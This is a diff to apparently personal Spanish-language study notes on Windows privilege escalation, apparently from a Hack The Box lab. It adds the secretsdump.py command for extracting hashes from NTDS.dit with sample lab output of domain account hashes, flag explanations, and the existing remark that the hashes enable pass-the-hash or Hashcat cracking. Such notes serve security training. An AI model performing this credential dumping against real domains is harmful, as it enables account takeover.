@@ -310,7 +310,35 @@ Credential Roaming
 
 ```bash
 $ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+
+
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
+htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+
+<SNIP>
 ```
+- `-ntds ntds.dit` Indica la ruta del archivo NTDS.dit
+- `-system SYSTEM` Es el archivo `SYSTEM hive` del registro de Windows.
+- `-hashes lmhash:nthash` Permite especificar manualmente los hashes LM y NTLM si ya los tienes.
+
+Si no existen LM hashes (lo común en sistemas modernos), se usa aad3b435b51404eeaad3b435b51404ee como valor vacío.
+
+Ejemplo: -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
 
 * Output: lista en formato `user:rid:lmhash:nthash`.
 * Con los hashes se puede realizar **pass-the-hash** o cracking offline (Hashcat) para obtener contraseñas en texto.
